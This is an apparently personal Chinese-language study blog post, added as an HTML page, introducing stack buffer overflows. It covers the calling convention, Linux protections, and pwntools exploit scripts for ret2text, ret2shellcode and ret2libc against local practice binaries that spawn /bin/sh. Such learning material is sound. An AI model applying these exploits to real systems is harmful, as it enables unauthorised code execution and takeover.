@@ -1,0 +1,1339 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="blog, tech, hexo">
+    <meta name="description" content="记录技术与思考">
+    <meta name="author" content="zach0ry">
+    
+    <title>
+        
+            初识栈溢出 |
+        
+        b1nary
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/fire.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"zach0ry-zzh.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"b1nary","author":"zach0ry","avatar":"/images/author.jpg","logo":"/images/fire.svg","favicon":"/images/fire.svg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","tags":"/tags || fa-solid fa-tags","categories":"/categories || fa-solid fa-layer-group"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["炼气","筑基","结丹","元婴","化神","渡劫","大乘"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"search":{"path":"search.json","field":"post","content":true,"format":"striptags"},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/fire.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               b1nary
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-layer-group"></i>
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-layer-group"></i>
+                                </span>
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        初识栈溢出
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/author.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">zach0ry</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-07-05</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Tue Sep 02 2025 17:19:16 GMT+0800">2025-09-02</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/pwn-study/">pwn_study</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171334911.png"  alt="img"></p>
+<h2 id="fun-a-b-调用过程"><a href="#fun-a-b-调用过程" class="headerlink" title="fun(a,b)调用过程"></a>fun(a,b)调用过程</h2><p><strong>入栈</strong></p>
+<p>（1）<strong>压入参数</strong> </p>
+<p>根据调用约定，<code>main</code>函数作为调用者，首先需要将<code>func</code>函数的两个参数a,b压入栈中。</p>
+<p>注意压入参数的顺序，首先压入b，接着压入a，也就是说，压入参数的顺序是<strong>从右到左</strong>。</p>
+<p>（2）<strong>返回地址压栈</strong></p>
+<p>返回地址压栈。main函数为了让<code>func</code>函数调用后正常返回，需要将当前指令（call指令）的下一条指令的地址压入栈中</p>
+<p>call指令包含两个步骤：main函数的下一条指令压栈；控制eip为<code>func</code>函数的第一条语句，eip存储着CPU将要执行的指令的地址</p>
+<p>（3）<strong>func函数运行</strong></p>
+<p><code>func</code>函数需要自己的内部运作空间。可以使用以下指令序列开辟空间：<code>push ebp</code>   <code>mov ebp,esp</code>  <code>sub esp,28h</code></p>
+<p>这个28h就是开辟的存储<code>func</code>函数的相关内存的空间</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171403792.png"  alt="image-20250711171403792"></p>
+<p><code>mov ebp,esp</code>看似没有变化，但EBP 从“保存调用者基址”变为“当前函数的栈帧基址”。</p>
+<p>（4）<strong>func函数的局部变量和参数</strong></p>
+<p><code>func</code>函数有自己内部的运作空间，即func_ebp到func_esp</p>
+<p>局部变量在编译之后会被表示为与ebp 不同的距离</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171421699.png"  alt="img"></p>
+<p>v2被表示为ebp -18h，v3被表示为ebp -10h。</p>
+<p>注意，这里的v2, v3和v4都是局部变量。参数的读取方式例子:第一个参数是ebp+8，第二个参数是ebp+12</p>
+<p>因为调用约定，肯定有main_next和main_ebp在ebp的上方，故偏移是固定的，在返回地址main_next上面</p>
+<p>然后，<code>func</code>函数返回。两个步骤：清除栈空间，返回到之前执行的指令（main_next）处。</p>
+<p>(5)<strong>func函数返回步骤1:清除栈空间</strong></p>
+<p>每个函数清除栈空间时可以使用一条公用指令leave。</p>
+<p>leave包含两个步骤：</p>
+<p>①<code>mov esp,ebp</code>将栈顶设置为栈基，即将func_ebp到func_esp的内容全部出栈；</p>
+<p>②<code>pop ebp</code> 将main_ebp的内容重新弹回ebp，使main函数的栈基址得到恢复</p>
+<p>(6)<strong>func函数返回步骤2：返回之前执行的指令（main_next）处</strong></p>
+<p>每个函数返回时可以使用一条公用指令ret。ret包含一个步骤：将栈顶弹出到eip寄存器（即下一条指令的位置），达到恢复main函数执行顺序的</p>
+<p>目的。</p>
+<p>到这里，main函数的栈基址和下一条指令都得到了恢复，也就完成了整个func函数的调用。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171510506.png"  alt="img"></p>
+<h2 id="Linux操作系统的保护"><a href="#Linux操作系统的保护" class="headerlink" title="Linux操作系统的保护"></a>Linux操作系统的保护</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171532889.png"  alt="img"></p>
+<p> <code>Arch:amd64-64-little</code>：</p>
+<p>amd64即x86_64(CPU架构)                 </p>
+<p>64即字长为64，返回地址在栈中占 8字节，32位是4字节）</p>
+<p>little表示小端序，如果是big则表示大端序。以数字0x12345678为例，小端序存储的是\x78\x56\x34\x12，大端序存储的是\x12\x34\x56\x78</p>
+<p><code>RELRO：Partial RELRO</code>:</p>
+<p>Partial RELRO和Full RELRO的区别可以简单理解为GOT写权限的区别，Partial RELRO相当于GOT可写，Full RELRO相当于GOT不可写。</p>
+<p><code>NX：NX enabled</code>:</p>
+<p>如果开启了NX保护机制，那么w权限和x权限就是互斥的,即不存在既拥有写权限又拥有执行权限的段。这个保护机制是用来防止shellcode植入的。在gdb调试中，可以通过vmmap命令来查看每个段的权限。</p>
+<p><code>PIE：No PIE（0x8048000）</code></p>
+<h2 id="ret2text-覆盖返回地址"><a href="#ret2text-覆盖返回地址" class="headerlink" title="ret2text(覆盖返回地址)"></a>ret2text(覆盖返回地址)</h2><p>该函数内存在get漏洞</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171548307.png"  alt="image-20250711171548307"></p>
+<p>该函数泄露了后门函数</p>
+<p>接着通过gets函数栈溢出将这个地址改为target，那么vulnfunc返回的时候，用ret指令取出栈顶的元素返回，就会返回到target这个函数</p>
+<p>target函数中有system（”&#x2F;bin&#x2F;sh”）这个后门，类似于在Linux的终端直接调用&#x2F;bin&#x2F;sh。利用这种方式可以直接返回一个shell，进而得到目标主机的shell，拿到控制权。</p>
+<p>找填充字节</p>
+<p>直接从IDA中读出长度</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171603088.png"  alt="image-20250711171603088"></p>
+<p>s到vulnfunc的ebp的距离是108h，所以到main_next的距离是0x108+4</p>
+<p>那个4是32位的ebp的空间</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;./ret2text&quot;)</span><br><span class="line">p.recvuntil(&quot;ret2text\n&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;* (0x108+4) + p32(0x0804850B)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2shellcode（覆盖返回地址到Shellcode）"><a href="#ret2shellcode（覆盖返回地址到Shellcode）" class="headerlink" title="ret2shellcode（覆盖返回地址到Shellcode）"></a>ret2shellcode（覆盖返回地址到Shellcode）</h2><p>Shellcode是<strong>机器码格式的恶意代码</strong>，指的是用于完成某个功能的汇编代码，常用的功能是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要求对应的二进制文件没有开启NX保护</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171705724.png"  alt="image-20250711171705724"></p>
+<p> <code>printf(&quot;%p\n&quot;, s)</code>输出了S的缓冲区的位置</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171725511.png"  alt="image-20250711171725511"></p>
+<p>没有开启NX保护</p>
+<p>所以可以向进程中写入一段Shellcode（利用w写权限），再执行这段Shellcode（利用x执行权限）。</p>
+<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &quot;i386&quot;</span><br><span class="line">p = process(&quot;./ret2shellcode&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x08048593&quot;)</span><br><span class="line">p.recvuntil(b&quot;ret2shellcode\n&quot;) # 修改为字节串</span><br><span class="line">target = int(p.recvuntil(b&quot;\n&quot;,drop = True),16) # 修改为字节串</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">payload = sc+b&#x27;a&#x27; * (0x108 + 4-len(sc))+ p32(target) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><code>context.arch = &quot;i386&quot;</code>说明程序的架构，使用 <code>asm()</code> 函数将 shellcode (<code>shellcraft.sh()</code>) 汇编成机器码时，<code>pwntools</code> 需要知道目标架构是 32 位还是 64 位，以便生成正确的指令集。32 位和 64 位的指令是不同的。</p>
+<p><code>target = int(p.recvuntil(b&quot;\n&quot;,drop = True),16)</code> 接收知道读取到&#x2F;n，(输出的缓冲区的地址)，转化为十六进制整数，且<code>drop = True</code>方便地<strong>清理</strong>你接收到的数据。只提取某个模式（比如一个地址、一个数字或一个特定的字符串）而不包含用于分隔或终止的字符（如换行符、空格、冒号等）</p>
+<p><code>sc = asm(shellcraft.sh())</code>生成启动<code>/bin/sh</code>的机器码</p>
+<p><code>payload = sc+b&#39;a&#39; * (0x108 + 4-len(sc))+ p32(target)</code> 从右到左入栈，p32(target):覆盖返回地址，b’a’ * (0x108 + 4 - len(sc)):填充从sc结束位置到返回地址之间所有“无用”的栈空间。sc:当 sc位于缓冲区的起始位置。</p>
+<p>context(arch &#x3D; ‘amd64’, os &#x3D; ‘linux’, log_level &#x3D; ‘debug’)</p>
+<p>这种context的信息可以通过指令file+文件名 得到</p>
+<p>输出示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrctf2020_shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, …</span><br></pre></td></tr></table></figure>
+
+<p>这里关键的信息：</p>
+<ul>
+<li><strong>ELF</strong> → 说明是 Linux</li>
+<li><strong>64-bit</strong> → 说明是 64 位</li>
+<li><strong>x86-64</strong> → 架构就是 <code>amd64</code>（pwntools 里写 <code>amd64</code>）</li>
+</ul>
+<p>如果输出是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF 32-bit LSB executable, Intel 80386</span><br></pre></td></tr></table></figure>
+
+<p>那你就用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>如果是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF 32-bit LSB executable, ARM</span><br></pre></td></tr></table></figure>
+
+<p>那你就用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(arch=&#x27;arm&#x27;, os=&#x27;linux&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p><strong>NX 保护 (No-Execute)</strong>: 它的<strong>唯一目的</strong>是阻止你在<strong>数据区域（比如栈和堆）执行代码</strong>。你可以把栈和堆想象成一块“只写数据，不能跑程序”的区域。</p>
+<ul>
+<li><strong>允许什么？</strong> 允许你在栈上写数据（比如填充字符串 <code>AAAA</code>，或者一些地址）。 允许你修改寄存器的值。 允许你覆盖返回地址。</li>
+<li><strong>阻止什么？</strong> 阻止你把自己的汇编代码（我们称之为 Shellcode）放在栈上，然后让程序去执行它。</li>
+</ul>
+<h3 id="ret2libc1（单个函数的rop来链）"><a href="#ret2libc1（单个函数的rop来链）" class="headerlink" title="ret2libc1（单个函数的rop来链）"></a>ret2libc1（单个函数的rop来链）</h3><p>第一步，先看保护</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170101689.png"  alt="image-20250713170101689"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170137922.png"  alt="image-20250713170137922"></p>
+<p>get溢出</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713165720453.png"  alt="image-20250713165720453"></p>
+<p>system函数存在,但参数不是&#x2F;bin&#x2F;sh</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713165931741.png"  alt="image-20250713165931741"></p>
+<p>system函数存在,并且程序中心存在bin&#x2F;sh字符串</p>
+<p>所以可以把bin&#x2F;sh作为参数传入system函数中构造后门函数</p>
+<p>要构造一个后门函数，先调用system函数，然后按照调用流程，参数（bin&#x2F;sh字符串所在的位置）入栈，返回地址入栈</p>
+<p>payload的形式是**[垃圾填充] + [system函数地址] + [system返回地址] + [binsh字符串地址]**</p>
+<h4 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &quot;i386&quot; # 强烈建议加上这一行</span><br><span class="line">p = process(&quot;./ret2libc1&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x08048595&quot;) # 调试时启用</span><br><span class="line"></span><br><span class="line">#elf = ELF(&quot;./ret2libc1&quot;)</span><br><span class="line">#system = elf.plt[&quot;system&quot;]</span><br><span class="line">binsh = 0x0804A028 # 确保这个地址确实包含 &quot;/bin/sh&quot; 字符串</span><br><span class="line">p.recvuntil(b&quot;ret2libc1\n&quot;) </span><br><span class="line">payload = b&#x27;a&#x27; * (0x108 + 4)+ p32(0x080483D0)+p32(0)+p32(0x804A028)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>找到system函数位置</p>
+<p><code>elf = ELF(&quot;./ret2libc1&quot;)</code>        <code>system = elf.plt[&quot;system&quot;]</code>直接找到systemd的入口</p>
+<p><strong>注意</strong></p>
+<p>[system返回地址] 不能乱写，后门函数执行结束后会返回这个地址，错误的地址会引发崩溃</p>
+<p>1.<strong><code>elf.plt[&quot;exit&quot;]</code> (最常用，推荐)</strong>：</p>
+<ul>
+<li><strong>作用</strong>：让 <code>system(&quot;/bin/sh&quot;)</code> 执行完毕后，程序能够干净地调用 <code>exit()</code> 函数并退出。这是最推荐的做法，因为它确保了程序的正常终止。</li>
+<li><strong>优点</strong>：稳定、可靠，不会导致崩溃。</li>
+<li><strong>获取方式</strong>：<code>elf.plt[&quot;exit&quot;]</code> (<code>pwntools</code> 会自动解析)。</li>
+</ul>
+<p>2.<strong><code>0x0</code> 或其他无效地址 (导致崩溃)</strong>：</p>
+<ul>
+<li><strong>作用</strong>：如果你只关心 <code>system(&quot;/bin/sh&quot;)</code> 是否被执行，而不关心程序是否崩溃，那么可以随便填。</li>
+<li><strong>优点</strong>：最简单。</li>
+<li><strong>缺点</strong>：程序会崩溃，这在实际攻防中通常是不希望看到的。有时调试时为了快速验证 <code>system</code> 是否被调用，可能会暂时使用。</li>
+</ul>
+<h3 id="ret2libc2-两个函数的rop链"><a href="#ret2libc2-两个函数的rop链" class="headerlink" title="ret2libc2(两个函数的rop链)"></a>ret2libc2(两个函数的rop链)</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170240614.png"  alt="image-20250713170240614"></p>
+<p>该题没有bin&#x2F;sh字符串</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171815449.png"  alt="image-20250711171815449"></p>
+<p>所以我们要自己去通过get构造</p>
+<p>(1)func函数通过栈溢出修改返回地址为gets_addr,传入get()的参数，b作为get函数底色参数，即其从终端读取的数据要存入的地方</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171840435.png"  alt="image-20250711171840435">（)</p>
+<p>（2）get函数被调用后会为自己开辟空间，执行时再次通过栈溢出填入system函数的地址和参数，最后调用system执行构造好的后门函数</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171859788.png"  alt="image-20250711171859788"></p>
+<p>分析之后得到应该构造如下形式的payload</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171926928.png"  alt="image-20250711171926928"></p>
+<p>其中get()函数和sys函数的参数都是bss段，get()用来把bin&#x2F;sh写入bss段，sys和它构成后门函数</p>
+<p>get写入bss段的内容需要从终端读取，所以之后还要为其发送一个“bin&#x2F;sh”</p>
+<p>Payload的形式是<strong>p32（gets_addr）+p32（system_addr）+p32（gets_p1）+p32（system_p1）</strong>。</p>
+<p>开启了NX保护，写和运行不能同时实现，所以改变该函数的参数位置，所以把 <code>/bin/sh</code>）写入一个可写的内存区域。<code>.bss</code> 段是一个非常理想的选择，因为它：</p>
+<ul>
+<li><p>可写 </p>
+</li>
+<li><p>通常位于固定的地址（特别是在 <strong>没有开启 ASLR</strong> 的情况下）；</p>
+</li>
+<li><p>在程序运行期间未初始化的数据都存储在这里。</p>
+<p><strong>找bss地址</strong></p>
+<p>1.readelf</p>
+<p><code>readelf -S ret2libc2</code></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171951259.png"  alt="image-20250711171951259"></p>
+<p>2.gdb调试</p>
+<p><code>gdb ./ret2libc2</code>    <code>info files</code></p>
+<p><img   src="D:/Typora/image/a1f45cd6572f00a22b10553057e87fe.png"  alt="img"></p>
+<p>显示了bss段的始末位置</p>
+<p>3.脚本中直接得到</p>
+<p><code>elf.bss()</code></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172012341.png"  alt="image-20250711172012341"></p>
+<h4 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc2&quot;)</span><br><span class="line">gdb.attach(p,&quot;b *0x08048595&quot;)</span><br><span class="line">elf=ELF(&quot;./ret2libc2&quot;)</span><br><span class="line">sys=elf.plt[&quot;system&quot;]</span><br><span class="line">get=elf.plt[&quot;gets&quot;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>gdb调试检查是否成功写入</p>
+<p>c一下运行到下断点位置</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172028504.png"  alt="image-20250711172028504"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172042265.png"  alt="image-20250711172042265"></p>
+<p>这个时候第一个get已经实现，payload已经传入了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172056178.png"  alt="image-20250711172056178"></p>
+<p>下一步会进入我们传进去的get中</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172132836.png"  alt="image-20250711172132836"></p>
+<p>get 和system函数都执行结束后</p>
+<p><code>x/s 0x0804a040</code>发现bss内存入了bin&#x2F;sh</p>
+<h3 id="ret2libc2-多个函数的rop链"><a href="#ret2libc2-多个函数的rop链" class="headerlink" title="ret2libc2(多个函数的rop链)"></a>ret2libc2(多个函数的rop链)</h3><p>假设一个二进制文件里仅有read函数，read函数有三个参数（fd，addr和length）</p>
+<p>这是按照两个rop链写出的payload填补形式</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172207173.png"  alt="image-20250711172207173"></p>
+<p>函数read因为拥有三个参数，所以相应地在栈上需要有三个块的空间。这时，system函数的第一个参数的位置就会和read函数的第二个参数的位置冲突，导致无法将system函数的第一个参数放置在栈上。不方便直接覆盖，因为read的参数限制比较多</p>
+<p>所以这种情况就可以用pop&#x2F;ret进行</p>
